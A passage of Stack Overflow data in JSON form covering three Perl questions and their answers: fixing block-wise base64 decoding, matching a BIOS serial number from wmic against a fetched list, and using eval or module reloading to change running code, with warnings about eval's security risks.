80, "profile_image": "https://www.gravatar.com/avatar/fe33f45c5990a98cfcb1388581de07af?s=128&d=identicon&r=PG", "display_name": "Sebastian", "link": "https://stackoverflow.com/users/1147230/sebastian"}, "is_accepted": true, "score": 4, "last_activity_date": 1462699879, "creation_date": 1462699879, "answer_id": 37098317, "question_id": 37097996, "link": "https://stackoverflow.com/questions/37097996/perl-encoding-to-and-from-base64/37098317#37098317", "title": "Perl - Encoding to and from base64", "body": "<p>The block-wise encode/decode won't work. The encoding will result in a bigger output than necessary, because you restart every 60 * 57 = 3420 bytes, but for decoding, 3420 bytes won't be a complete Base64 block. Look at your result, you'll probably see not completely filled lines ending with some <code>=</code> chars.</p>\n\n<p>Here is a short sample with a blocksize of 10 for demonstration:</p>\n\n<pre><code>use MIME::Base64 qw(encode_base64);\n\nmy $in = \"abcdefghijklmnopqrstuvwxyz\";\nwhile (my $block = substr($in,0,10,\"\")) {\n    print encode_base64($block);\n}\n\nYWJjZGVmZ2hpag==\na2xtbm9wcXJzdA==\ndXZ3eHl6\n</code></pre>\n\n<p>Trying to decode this in blocks of 10 chars will try to decode these strings:</p>\n\n<pre><code>YWJjZGVmZ2\nhpag==\\na2x\ntbm9wcXJzd\nA==\\ndXZ3eH\nl6\\n\n</code></pre>\n\n<p>The first line correctly translates to <code>abcdefg</code>, but the second line is decoded to garbage.</p>\n\n<p>There's a command line tool called <code>base64</code> which does excatly the same: Encode and decode Base64 files. You should remove that blockwise processing, encode a file and try to decode it using the command line tool (assuming that it does things right). If this is working, your encode is also working, otherwise your encode doesn't work probably. Make it working and continue to the decoding part.</p>\n"}, {"tags": [], "owner": {"reputation": 15304, "user_id": 4632019, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/8937eb40752cf51c7da61bd4a322a4ef?s=128&d=identicon&r=PG&f=1", "display_name": "Eugen Konkov", "link": "https://stackoverflow.com/users/4632019/eugen-konkov"}, "is_accepted": false, "score": 1, "last_activity_date": 1462784445, "creation_date": 1462784445, "answer_id": 37111602, "question_id": 37097996, "link": "https://stackoverflow.com/questions/37097996/perl-encoding-to-and-from-base64/37111602#37111602", "title": "Perl - Encoding to and from base64", "body": "<p>You sould read about PerlIO layers. Also you are interested in <a href=\"http://search.cpan.org/~elizabeth/PerlIO-via-Base64-0.08/lib/PerlIO/via/Base64.pm#SYNOPSIS\" rel=\"nofollow\">PerlIO::via::Base64</a> module</p>\n\n<pre><code> use PerlIO::via::Base64 eol =&gt; \"\\n\";\n\n open( my $in,'&lt;:via(Base64)','file.mime' )\n  or die \"Can't open file.mime for reading: $!\\n\";\n\n open( my $out,'&gt;:via(Base64)','file.mime' )\n  or die \"Can't open file.mime for writing: $!\\n\";\n</code></pre>\n"}], "owner": {"reputation": 697, "user_id": 5449244, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/131ad184c67440a0a499852f247b4ea6?s=128&d=identicon&r=PG&f=1", "display_name": "onlyf", "link": "https://stackoverflow.com/users/5449244/onlyf"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1419, "favorite_count": 0, "accepted_answer_id": 37098317, "answer_count": 2, "score": -1, "last_activity_date": 1462784445, "creation_date": 1462697567, "question_id": 37097996, "link": "https://stackoverflow.com/questions/37097996/perl-encoding-to-and-from-base64", "title": "Perl - Encoding to and from base64", "body": "<p>i ve written the following script to convert files from and to base64.</p>\n\n<pre><code># Setup default mode\nmy $mode = '';\nmy $encoding = 'base64';\nmy $file = '';\n\n\nGetOptions(\n'mode=s'        =&gt; \\$mode,  # mode = Encode / decode\n'help!'         =&gt; \\$help,      # help message\n'encoding=s'    =&gt; \\$encoding,\n'file=s'        =&gt; \\$file\n) or die \"Incorrect usage!\\n\";\n\nif( $help ) {\nprint \"Common on, it's really not that hard.\\n\";\n} else {\nprint \"# Script parameters provided : \\n\";\nprint \"# Mode set to $mode.\\n\";\nprint \"# Encoding is set to $encoding\\n\";\nprint \"# Input File set to $file \\n\";\n}\n\n\nopen(FILE, \"$file\") or die \"$!\";\nopen FILEOT, \"&gt;$file.out\" or die \"$!\";  \nbinmode FILEOT;\nbinmode STDOUT; \n\nswitch ($mode) {\n\ncase \"encode\" { \n\n        print \"# Encoding file $file to $encoding \\n\";\n        print \"# Processing .... \\n\\n\";\n\n        while (read(FILE, $buf, 60*57)) {\n            $encoded = encode_base64($buf);\n            print $encoded;\n            print FILEOT $encoded;\n        }\n}\n\ncase \"decode\" {\n        print \"# Decoding file $file from $encoding \\n\";\n        print \"# Processing .... \\n\\n\";\n\n        while ( read(FILE, $buf, 60*57 ) {\n            $decoded = decode_base64($buf);\n            print $decoded;\n            print FILEOT $decoded;\n          }\n       }\n</code></pre>\n\n<p>The encoding part works as intended. The decoding part does not give any output. I gave it an input file of the likes :</p>\n\n<pre><code> My name is John\n I eat pineapples\n</code></pre>\n\n<p>and it gives no output. I think the buffered read may not be required in the case of decoding a file already encoded with this script earlier. I used the above test to produce the base64 encoding version but the reverse gives nothing. Can anyone help me?</p>\n"}, {"tags": ["perl", "serialization"], "answers": [{"comments": [{"owner": {"reputation": 75, "user_id": 5759343, "user_type": "registered", "accept_rate": 71, "profile_image": "https://graph.facebook.com/161717450855048/picture?type=large", "display_name": "&#223;\u0142 \u1eb6ck \u0124\u1eb7wk", "link": "https://stackoverflow.com/users/5759343/%c3%9f%c5%82-%e1%ba%b6ck-%c4%a4%e1%ba%b7wk"}, "edited": false, "score": 0, "creation_date": 1462697620, "post_id": 37097844, "comment_id": 61738874, "body": "I tried` print $serial` and the output is : SerialNumber NXV7VEM06332617BXXXXXX But when i add quotemeta function the output become :  \\SerialNumber\\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\XV7VEM06332617BXXXXXX\\ \\ \\ \\"}, {"owner": {"reputation": 2298, "user_id": 1147230, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe33f45c5990a98cfcb1388581de07af?s=128&d=identicon&r=PG", "display_name": "Sebastian", "link": "https://stackoverflow.com/users/1147230/sebastian"}, "reply_to_user": {"reputation": 75, "user_id": 5759343, "user_type": "registered", "accept_rate": 71, "profile_image": "https://graph.facebook.com/161717450855048/picture?type=large", "display_name": "&#223;\u0142 \u1eb6ck \u0124\u1eb7wk", "link": "https://stackoverflow.com/users/5759343/%c3%9f%c5%82-%e1%ba%b6ck-%c4%a4%e1%ba%b7wk"}, "edited": false, "score": 0, "creation_date": 1462700069, "post_id": 37097844, "comment_id": 61739441, "body": "Looks like there are some unprintable chars in the string. Try using <code>Data::Dumper</code> to see what&#39;s going on or try <code>print unpack(&quot;H*&quot;,$serial)</code> to get the hex representation of the string which should show you the chars (maybe ASCII-0 = <code>\\x00</code>). You could also use a RegEx to extract the pure serial number from that string, something like <code>$serial =~ &#47;Serial\\W+(\\w+)&#47;; $ff = $1;</code>"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462726852, "post_id": 37097844, "comment_id": 61747027, "body": "The required information is buried within some layout text with Windows&#39; CR LF as line terminators. It&#39;s very simple to extract using a regex, but there&#39;s no point in waving random operators at it. Neither <code>chomp</code> nor <code>quotemeta</code> will help here"}], "tags": [], "owner": {"reputation": 2298, "user_id": 1147230, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe33f45c5990a98cfcb1388581de07af?s=128&d=identicon&r=PG", "display_name": "Sebastian", "link": "https://stackoverflow.com/users/1147230/sebastian"}, "is_accepted": false, "score": -1, "last_activity_date": 1462696433, "creation_date": 1462696433, "answer_id": 37097844, "question_id": 37097516, "link": "https://stackoverflow.com/questions/37097516/get-bios-serial-number-in-perl/37097844#37097844", "title": "Get Bios serial number in perl", "body": "<p>You should add some debug output:</p>\n\n<ul>\n<li>print <code>$serial</code> to check if it's read correctly. Maybe you need to be root to read it?</li>\n<li>print <code>$source</code> to check if the file has been downloaded correctly.</li>\n</ul>\n\n<p>You probably need to <a href=\"http://perldoc.perl.org/functions/chomp.html\" rel=\"nofollow\"><code>chomp $serial</code></a> to cut off any line break suffix.</p>\n\n<p>The serial number might contain RegEx special chars (for example <code>. + * ( ) { } [ ] - ?</code>). Try</p>\n\n<pre><code>$ff = quotemeta($serial);\n</code></pre>\n\n<p><a href=\"http://perldoc.perl.org/functions/quotemeta.html\" rel=\"nofollow\"><code>quotemeta</code> will escape all reserved chars</a>.</p>\n\n<p>PS: There is no need to copy <code>$serial</code> to <code>$ff</code>. Just a waste of memory and CPU time unless you change it (like using <code>quotemeta</code>). You also don't need to put <code>\" \"</code> around variables used in source. Using them with RegEx is considered bad style. Try</p>\n\n<pre><code>if ($source =~ /$ff/){\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 75, "user_id": 5759343, "user_type": "registered", "accept_rate": 71, "profile_image": "https://graph.facebook.com/161717450855048/picture?type=large", "display_name": "&#223;\u0142 \u1eb6ck \u0124\u1eb7wk", "link": "https://stackoverflow.com/users/5759343/%c3%9f%c5%82-%e1%ba%b6ck-%c4%a4%e1%ba%b7wk"}, "edited": false, "score": 0, "creation_date": 1462776771, "post_id": 37100162, "comment_id": 61760642, "body": "Thank you very much bro ^_^"}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 0, "last_activity_date": 1467563770, "last_edit_date": 1467563770, "creation_date": 1462712642, "answer_id": 37100162, "question_id": 37097516, "link": "https://stackoverflow.com/questions/37097516/get-bios-serial-number-in-perl/37100162#37100162", "title": "Get Bios serial number in perl", "body": "<p>There are several issues here, all to do with the exact contents of various strings.</p>\n\n<p>The WMIC command doesn't just hand back <code>61-1210-000747-00101111-071595-M747</code> because it's meant for a command-line interface and has to look nice in that context</p>\n\n<p><strong><em>Note that I can't test this directly as my Windows system is hand-built and has no serial number</em></strong></p>\n\n<p>Instead, it returns something like</p>\n\n<pre><code>\"SerialNumber  \\r\\n61-1210-000747-00101111-071595-M747\\r\\n\\r\\n\"\n</code></pre>\n\n<p>and searching for that in the <code>serials.txt</code> file on your intranet is pretty much bound to fail. You need to isolate the serial number from the surrounding text using something like this</p>\n\n<pre><code>my $response = qx(wmic bios GET SerialNumber);\nmy ($serial) = $response =~ /^SerialNumber\\s+(\\S+)/;\n</code></pre>\n\n<p>There is also a problem with using a regex pattern to search the contents of the <code>serials.txt</code> on your intranet. It would be best to parse the contents of that file properly, but you don't show what it looks like</p>\n\n<p>Instead you can use <code>\\Q...\\E</code> in the regex pattern, so that any regex metacharacters that may be in the serial number are handled literally instead. You will als need to surround that in <code>\\b...\\b</code> so that a serial number like <code>123A</code> isn't \"validated\" because it happens to be a substring of <code>ABC-123AD-59F</code> in the <code>serials.txt</code> file</p>\n\n<p>This should work for you</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings 'all';\n\nuse LWP::Simple 'get';\nuse Data::Dump 'dump';\n\nuse constant SERIALS_URL =&gt; 'http://localhost/Check/serials.txt';\n\n\nmy $response = qx(wmic bios GET SerialNumber);\nmy ($serial) = $response =~ /^SerialNumber\\s+(\\S+)/\n        or die sprintf qq{Unexpect response %s\\n    from WMIC}, dump $response;\n\n\nmy $source = get SERIALS_URL or die;\n\n\nif ( $source =~ /\\b\\Q$serial\\E\\b/ ) {\n    print \"Serial Found\\n\";\n}\nelse{\n    print qq{Serial number \"$serial\" not found in our database};\n}\n</code></pre>\n"}], "owner": {"reputation": 75, "user_id": 5759343, "user_type": "registered", "accept_rate": 71, "profile_image": "https://graph.facebook.com/161717450855048/picture?type=large", "display_name": "&#223;\u0142 \u1eb6ck \u0124\u1eb7wk", "link": "https://stackoverflow.com/users/5759343/%c3%9f%c5%82-%e1%ba%b6ck-%c4%a4%e1%ba%b7wk"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 396, "favorite_count": 0, "accepted_answer_id": 37100162, "answer_count": 2, "score": 0, "last_activity_date": 1467563770, "creation_date": 1462693976, "question_id": 37097516, "link": "https://stackoverflow.com/questions/37097516/get-bios-serial-number-in-perl", "title": "Get Bios serial number in perl", "body": "<p>I want to get the Bios serial number then check if it is exist in webpage content using Perl , I tried this code : </p>\n\n<pre><code>#!/usr/bin/perl\nuse LWP::Simple;\nmy $serial = qx(wmic bios  GET SerialNumber 2&gt;&amp;1);\nmy $source = get(\"http://localhost/Check/serials.txt\");\nmy $ff = \"$serial\";\n\nif (\"$source\" =~ \"$ff\"){\n    print \"Serial Found ^_^\\n\";\n}else{\n    print \"Sorry , Serial Not Found In Our Database !!\\n\";\n}\n</code></pre>\n\n<p>* the URL <code>http://localhost/Check/serials.txt</code> have list of serial numbers.</p>\n\n<p>But script always give me <code>Sorry , Serial Not Found In Our Database !!</code> but the serial number of my Bios is found !!</p>\n"}, {"tags": ["perl", "file-handling"], "comments": [{"owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "edited": false, "score": 0, "creation_date": 1462679211, "post_id": 37095921, "comment_id": 61735422, "body": "As I mention in <a href=\"http://stackoverflow.com/a/37096010/14660\">my answer</a>, you can do this but it&#39;s a <i>major</i> security hole. What problem are you trying to solve with this? There&#39;s probably a better solution."}, {"owner": {"reputation": 733, "user_id": 6284025, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/520dd4eff97633730b91a53097f309f6?s=128&d=identicon&r=PG&f=1", "display_name": "TallChuck", "link": "https://stackoverflow.com/users/6284025/tallchuck"}, "reply_to_user": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "edited": false, "score": 0, "creation_date": 1462679834, "post_id": 37095921, "comment_id": 61735518, "body": "It&#39;s not for anything in particular, I was just curious to see if it would work. The eval function isn&#39;t quite what I was going for, because I wanted it to more than just execute the print function. I thought if someone was really clever they could work something like this into making a program that can reprogram itself over time."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1462679930, "post_id": 37095921, "comment_id": 61735535, "body": "The code written in a module can be manipulated in that way, by reloading that module. See my answer.   If it&#39;s just for play :)"}, {"owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "edited": false, "score": 0, "creation_date": 1462680627, "post_id": 37095921, "comment_id": 61735643, "body": "@TallChuck You can! Subroutines can be replaced at runtime. Instead of single statements, <code>eval</code> entire subroutines."}, {"owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "edited": false, "score": 0, "creation_date": 1462681491, "post_id": 37095921, "comment_id": 61735746, "body": "@TallChuck I&#39;ve updated <a href=\"http://stackoverflow.com/a/37096010/14660\">my answer</a> with an illustration of replacing subroutines."}, {"owner": {"reputation": 733, "user_id": 6284025, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/520dd4eff97633730b91a53097f309f6?s=128&d=identicon&r=PG&f=1", "display_name": "TallChuck", "link": "https://stackoverflow.com/users/6284025/tallchuck"}, "reply_to_user": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "edited": false, "score": 0, "creation_date": 1462682029, "post_id": 37095921, "comment_id": 61735831, "body": "@Schwern ah okay interesting, I didn&#39;t know you could do that"}], "answers": [{"tags": [], "owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "is_accepted": false, "score": 3, "last_activity_date": 1462681246, "last_edit_date": 1462681246, "creation_date": 1462679132, "answer_id": 37096010, "question_id": 37095921, "link": "https://stackoverflow.com/questions/37095921/using-filehandles-in-perl-to-alter-actively-running-code/37096010#37096010", "title": "Using filehandles in Perl to alter actively running code", "body": "<p>The missing piece you need is <a href=\"http://perldoc.perl.org/functions/eval.html\" rel=\"nofollow\"><code>eval EXPR</code></a>. This compiles, \"evaluates\", any string as code.</p>\n\n<pre><code>my $string = q[print \"Hello, world!\";];\neval $string;\n</code></pre>\n\n<p>This string can come from any source, including a filehandle.</p>\n\n<p>It also doesn't have to be a single statement. If you want to modify how a program runs, you can replace its subroutines.</p>\n\n<pre><code>use strict;\nuse warnings;\nuse v5.10;\n\nsub speak { return \"Woof!\"; }\nsay speak();\n\neval q[sub speak { return \"Meow!\"; }];\nsay speak();\n</code></pre>\n\n<p>You'll get a <code>Subroutine speak redefined</code> warning from that. It can be supressed with <code>no warnings \"redefine\"</code>.</p>\n\n<pre><code>{\n    # The block is so this \"no warnings\" only affects\n    # the eval and not the entire program.\n    no warnings \"redefine\";\n    eval q[sub speak { return \"Shazoo!\"; }];\n}\nsay speak();\n</code></pre>\n\n<p>Obviously this is a <em>major</em> security hole. There is many, many, many things to consider here, too long for an answer, and I <em>strongly</em> recommend you not do this and find a better solution to whatever problem you're trying to solve this way.</p>\n\n<p>One way to mitigate the potential for damage is to use the <a href=\"https://metacpan.org/pod/Safe\" rel=\"nofollow\">Safe</a> module. This is like <code>eval</code> but limits what built in functions are available. It is by no means a panacea for the security issues.</p>\n"}, {"comments": [{"owner": {"reputation": 733, "user_id": 6284025, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/520dd4eff97633730b91a53097f309f6?s=128&d=identicon&r=PG&f=1", "display_name": "TallChuck", "link": "https://stackoverflow.com/users/6284025/tallchuck"}, "edited": false, "score": 0, "creation_date": 1462680082, "post_id": 37096011, "comment_id": 61735560, "body": "yeah I thought about something like that but the point isn&#39;t to re-execute the whole program, I want any program that implements this to be able to continue running as normal."}, {"owner": {"reputation": 74, "user_id": 5380671, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-e7XiVA7Ezhk/AAAAAAAAAAI/AAAAAAAAABA/fGKEL7hbgNk/photo.jpg?sz=128", "display_name": "ahendrickson", "link": "https://stackoverflow.com/users/5380671/ahendrickson"}, "reply_to_user": {"reputation": 733, "user_id": 6284025, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/520dd4eff97633730b91a53097f309f6?s=128&d=identicon&r=PG&f=1", "display_name": "TallChuck", "link": "https://stackoverflow.com/users/6284025/tallchuck"}, "edited": false, "score": 0, "creation_date": 1462680355, "post_id": 37096011, "comment_id": 61735603, "body": "Gotcha. Wrapping the entire file-contents in <code>eval</code> will re-execute it anyways, so be sure to add some comment identifiers in your code above where you want to begin to execute, and then regex to that spot. Otherwise, you could be importing modules n+ times, and n+ errors"}], "tags": [], "owner": {"reputation": 74, "user_id": 5380671, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-e7XiVA7Ezhk/AAAAAAAAAAI/AAAAAAAAABA/fGKEL7hbgNk/photo.jpg?sz=128", "display_name": "ahendrickson", "link": "https://stackoverflow.com/users/5380671/ahendrickson"}, "is_accepted": false, "score": -1, "last_activity_date": 1462679150, "creation_date": 1462679150, "answer_id": 37096011, "question_id": 37095921, "link": "https://stackoverflow.com/questions/37095921/using-filehandles-in-perl-to-alter-actively-running-code/37096011#37096011", "title": "Using filehandles in Perl to alter actively running code", "body": "<p>There's almost definitely a better way to achieve your end goal here. BUT, you could recursively make exec() or system() calls -- latter if you need a return value. Be sure to setup some condition or the dominoes will keep falling. Again, you should rethink this, unless it's just practice of some sort, or maybe I don't get it! </p>\n\n<p>Each call should execute the latest state of the file; also be sure to close the file before each call.</p>\n\n<p>i.e., </p>\n\n<p><code>exec(\"dynamic.pl\");</code> or </p>\n\n<pre><code>my retval; \nretval = system(\"perl dynamic.pl\");\n</code></pre>\n\n<p>Don't use eval ever.</p>\n"}, {"comments": [{"owner": {"reputation": 733, "user_id": 6284025, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/520dd4eff97633730b91a53097f309f6?s=128&d=identicon&r=PG&f=1", "display_name": "TallChuck", "link": "https://stackoverflow.com/users/6284025/tallchuck"}, "edited": false, "score": 0, "creation_date": 1462680164, "post_id": 37096022, "comment_id": 61735572, "body": "interesting, I&#39;ll look into that. Maybe I wasn&#39;t very clear with my question, but you seem to be the only one who understood what I was going for."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 733, "user_id": 6284025, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/520dd4eff97633730b91a53097f309f6?s=128&d=identicon&r=PG&f=1", "display_name": "TallChuck", "link": "https://stackoverflow.com/users/6284025/tallchuck"}, "edited": false, "score": 0, "creation_date": 1462680390, "post_id": 37096022, "comment_id": 61735606, "body": "@TallChuck  This is the only way I know of to do what you are asking  -- to actually modify code that runs, not just read in new code.  (Which is why I didn&#39;t mention eval.)  However, you <i>did</i> ask about filehandles. Is that critical, do you insist on involving filehandles in some particular way?"}, {"owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "edited": false, "score": 0, "creation_date": 1462680772, "post_id": 37096022, "comment_id": 61735658, "body": "@zdim Good mention of Module::Reload. However you do mention <code>eval</code> indirectly. <code>require</code>, loading or reloading a module, is reading a file and <code>eval</code>ing it."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "edited": false, "score": 0, "creation_date": 1462680955, "post_id": 37096022, "comment_id": 61735675, "body": "@Schwern  Well, yes.  But it is a module, which is loaded at start so it <i>is</i> a part of the running program to be altered.  I meant with my comment that I didn&#39;t go for <code>eval</code>-ing <i>other</i> code.  Is that what you mean, about the comment I made?  Thank you very much for commenting. Yes, I see, the comment is sloppy.  Should&#39;ve been far more precise.  Thank you."}, {"owner": {"reputation": 733, "user_id": 6284025, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/520dd4eff97633730b91a53097f309f6?s=128&d=identicon&r=PG&f=1", "display_name": "TallChuck", "link": "https://stackoverflow.com/users/6284025/tallchuck"}, "edited": false, "score": 0, "creation_date": 1462681362, "post_id": 37096022, "comment_id": 61735725, "body": "@zdim I just brought in filehandles because that was what got me thinking about it in the first place. I thoought &quot;If I can edit other files, why can&#39;t I edit my source code...with my source code?&quot;"}, {"owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "edited": false, "score": 0, "creation_date": 1462681441, "post_id": 37096022, "comment_id": 61735741, "body": "@zdim <code>use</code> happens during compilation <i>of that particular unit</i>, but <code>require</code> happens at runtime. Yes, I&#39;m being picky, but with a point: <code>eval</code> itself isn&#39;t evil. We use <code>eval</code> all the time to load modules, but it&#39;s restricted to files in <code>@INC</code> and hopefully those directories are trusted. It&#39;s the source of the thing you&#39;re evaling that&#39;s evil and exploitable. This is <i>in no way</i> an encouragement to use <code>eval</code> in production."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "edited": false, "score": 0, "creation_date": 1462683416, "post_id": 37096022, "comment_id": 61736009, "body": "@Schwern Agree completely with all of it. I use eval (via require) all the time to selectively load modules (after BEGIN, at runtime per need). What I meant with distinguishing between them is about re-loading a module, so changing source code that already runs (vs. inserting new code). Of course, that is eval-ing too, thankj you for pointing it out.  Any and all of this, clearly, is with the understanding that it is only for play."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 2, "last_activity_date": 1564994947, "last_edit_date": 1564994947, "creation_date": 1462679252, "answer_id": 37096022, "question_id": 37095921, "link": "https://stackoverflow.com/questions/37095921/using-filehandles-in-perl-to-alter-actively-running-code/37096022#37096022", "title": "Using filehandles in Perl to alter actively running code", "body": "<p>With a warning about all kinds of issues, you can reload modules.</p>\n\n<p>There are packages for that, for example, <a href=\"http://search.cpan.org/~neilb/Module-Reload-1.10/lib/Module/Reload.pm\" rel=\"nofollow noreferrer\">Module::Reload</a>.  Then you can write code that you intend to change in a module, change the source at runtime, and have it reloaded.</p>\n\n<p>By hand you would delete that from <code>%INC</code> and then <code>require</code>, like</p>\n\n<pre><code># ... change source code in the module ...\ndelete $INC{'ModuleWithCodeThatChages.pm'};\nrequire ModuleWithCodeThatChanges;\n</code></pre>\n\n<p>The only reason I can think of for doing this is experimentation and play.  Otherwise, there are all kinds of concerns with doing something like this, and whatever your goal may be there are other ways to accomplish it.</p>\n\n<p><strong>Note</strong> &nbsp; The question does specify a filehandle. However, I don't see that to be really related to what I see to be the heart of the question, of modifying code at runtime.</p>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 0, "last_activity_date": 1462725087, "creation_date": 1462725087, "answer_id": 37102148, "question_id": 37095921, "link": "https://stackoverflow.com/questions/37095921/using-filehandles-in-perl-to-alter-actively-running-code/37102148#37102148", "title": "Using filehandles in Perl to alter actively running code", "body": "<p>The source file isn't used after it's been compiled.</p>\n\n<p>You could just <code>eval</code> it.</p>\n\n<pre><code>use strict;\nuse warnings;\n\nmy $code = &lt;&lt;'__EOS__'\nprint \"It works!!\\n\";\n__EOS__\n\nopen(my $append_fh, \"&gt;&gt;\", \"dynamic.pl\")\n   or die($!);\nprint($append_fh $code);\neval(\"$code; 1\")\n   or die($@);\n</code></pre>\n"}], "owner": {"reputation": 733, "user_id": 6284025, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/520dd4eff97633730b91a53097f309f6?s=128&d=identicon&r=PG&f=1", "display_name": "TallChuck", "link": "https://stackoverflow.com/users/6284025/tallchuck"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 92, "favorite_count": 0, "accepted_answer_id": 37096022, "answer_count": 4, "score": 1, "last_activity_date": 1564994947, "creation_date": 1462678100, "question_id": 37095921, "link": "https://stackoverflow.com/questions/37095921/using-filehandles-in-perl-to-alter-actively-running-code", "title": "Using filehandles in Perl to alter actively running code", "body": "<p>I've been learning about filehandles in Perl, and I was curious to see if there's a way to alter the source code of a program as it's running. For example, I created a script named \"dynamic.pl\" which contained the following:</p>\n\n<pre><code>use strict;\nuse warnings;\n\nopen(my $append, \"&gt;&gt;\", \"dynamic.pl\");\nprint $append 